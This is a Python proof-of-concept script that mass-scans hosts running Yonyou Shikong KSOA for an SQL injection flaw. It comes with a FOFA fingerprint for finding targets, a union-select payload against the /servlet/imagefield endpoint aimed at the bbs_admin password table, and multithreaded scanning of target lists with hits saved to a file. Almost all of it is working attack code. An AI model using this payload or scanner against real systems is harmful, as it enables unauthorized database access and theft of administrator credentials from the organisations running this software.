# 用友-时空KSOA SQL注入漏洞
# fofa: app="用友-时空KSOA"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """    _  ______   ___    _      ____   ___  _     
 | |/ / ___| / _ \  / \    / ___| / _ \| |    
 | ' /\___ \| | | |/ _ \   \___ \| | | | |    
 | . \ ___) | |_| / ___ \   ___) | |_| | |___ 
 |_|\_\____/ \___/_/   \_\ |____/ \__\_\_____|
                                                                                          
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友-时空KSOA SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Connection':'close',
        'Accept':'*/*',
        'Accept-Language':'en',
        'Accept-Encoding':'gzip'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if '0x098f6bcd4621d373cade4e832627b4f6' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')
    

if __name__ == '__main__':
    main()
